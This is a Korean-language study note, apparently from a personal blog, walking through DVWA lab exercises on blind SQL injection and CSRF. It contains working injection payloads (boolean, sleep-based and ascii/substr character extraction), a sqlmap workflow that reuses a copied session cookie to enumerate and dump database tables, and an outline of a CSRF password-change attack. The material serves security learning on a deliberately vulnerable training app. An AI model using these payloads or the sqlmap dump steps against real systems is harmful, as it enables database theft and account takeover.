# DVWA 03

---

# SQL Injection(blind)


악용되면 데이터베이스의 정보를 다 털 수 있다. 매우위험!!


검색엔진 등에서 주로 테스트됨. 결과가 true 혹은 false로 나타날 때 시도할 수 있음. 



blind sql injectioin이 가능한지 확인하기?

`1' OR 1=1#` 이 쿼리가 먹는지 확인한다. true가 뜨면 되는거.


그리고 `1' AND 1=2#`에서 false가 나오는지 확인.


sleep?이라는걸 쓸수도 있대. delay를 살짝 주는 것.


`1' AND sleep(5)#` 이래 입력하고 검색결과가 5초 뒤에 나오는지 확인한다. 그러면 트루인거임.




<br></br>
---

## low




database의 information 스키마? 여기에 mysql의 메타데이터, 모든 정보가 담겨있다고 함. 그래서 주로 여기에 공격이 시도됨. DB명, 테이블명 등을 모두 포함하기 때문.


이걸 자동화해서 터는... 그런거를 만들어놈
SQL MAP이라는건데

1' AND ascii(substr((select first_name from users where user_id='1'), 1, 1))>91#

(select first_name from users where user_id='1')
이거의 결과값을 첫 인자로 넣어서
substr() 첫 인자의 몇번째부터 몇개를 따올건지
ascii() ascii값으로 변환


하나씩 늘려가며 대입해봤을 때 가장 먼저 false가 뜨는 그 값이 아이디의 첫 글자라고 유추할 수 있겠다. 

substr((select first_name from users where user_id='1'), **n**, 1)) 이면 n번째 글자를 의미함. 


사람이 다 하긴 너무 경우의 수가 많으니 SQL MAP 툴을 쓸 것임. 

[download](https://sqlmap.org/)


확인 가능한 폴더에서 압출 풀어주고,

해킹하고자 하는 사이트의 개발자도구 콘솔에 다음과 같이 입력해준다.

> `console.log(document.cookie);`

그리고 뜨는 이거를 카피해서
(1)
`security=low; PHPSESSID=7cjf6r14an9h4b5lmqsabcqhvr`

아까 sqlmap을 다운받은 경로에서 다음과 같이 입력


> python sqlmap.py -u "[대상링크]" --cookie="[아까복사한쿠키]"



> python sqlmap.py -u "http://localhost/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=7cjf6r14an9h4b5lmqsabcqhvr" 

--current-db 하면 현재 웹사이트에서 사용하는 DB명을 알 수 있음

(2) 이런식으로... 

-D [DB명, ex) dvwa] --tables 하면 테이블명 알아내기. 

-T [table명, ex) users] -dump 하면 뭐냐 해당 테이블의 덤프를 딴다고? 

덤프란? 데이터를 압축해서 새로운 뭔가를 만드는... 전체 조회? 느낌으로도 사용되는듯

(3) 짜잔티비



<br></br>
---

## medium


proxy를 사용하되 low와 기본적인건 동일함. 

`1 AND ascii(substr((select first_name from users where user_id=1),1,1))>91#`


(1) 요로코롬... 

<br></br>
---

## high

얘도 끝에 주석만 잘 넣어주면 low랑 똑같다! 


굿. 


<br></br>
---

## impossible


예아. 




<br></br>
---

# CSRF



pw를 바꿀 때 뭔가 권한접근을 따내는거.


새로운 패스워드를 바꾸려할 때 파라미터가 get방식으로 웹 창에 다 보이자나


그럼 그거를 조작하는 방식이에용...


원하는 pw로 변경하고 submit했을 때의 그 URL을 short시켜서, 그럴듯한 가짜 링크에서 리다이렉션되도록 해둔 뒤... 


누군가 링크로 들어가면 그 유저의 패스워드가 해커가 설정해둔걸로 변경되는 것. 


기존 pw를 함께 입력하게 한다던가 토큰을 써서 접근권한을 제한하면 막을 수 있다. 



**굿**





